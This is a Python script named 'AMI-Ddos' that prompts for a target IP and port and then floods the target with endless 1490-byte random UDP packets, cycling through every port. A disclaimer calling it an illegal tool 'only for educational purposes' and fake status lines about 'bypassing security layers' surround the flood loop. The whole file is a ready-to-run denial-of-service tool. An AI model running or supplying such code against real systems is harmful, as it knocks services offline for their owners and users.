print("\033[92m")
import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet AMI-Ddos")
print("Coded By : Maheshkumar C")
print("Author   : Maheshkumar C")
print("Github   : github.com/mahes1999")
print("Note- This Tool is an Illegal Tool & It's Only For Educational Purposes. Use It At Your Own Risk, We aren't responsible for your actions")
print()
ip = input("IP Target : ")
port = int(input("Port       : "))  # Convert input to an integer
os.system("clear")
os.system("figlet AMI-Ddos")
print("Team : AMI")
print("\033[92m")
print("________________TRYING TO REACH THE SERVER_____________________")
time.sleep(5)
print("_________________ESTABLISHING CONNECTION_______________________")
time.sleep(5)
print("_________0100100 BYPASSING SECURITY LAYER 001010_______________")
time.sleep(5)
print("_________________CONNECTION ESTABLISHED________________________")
time.sleep(5)
print("    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s through port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1
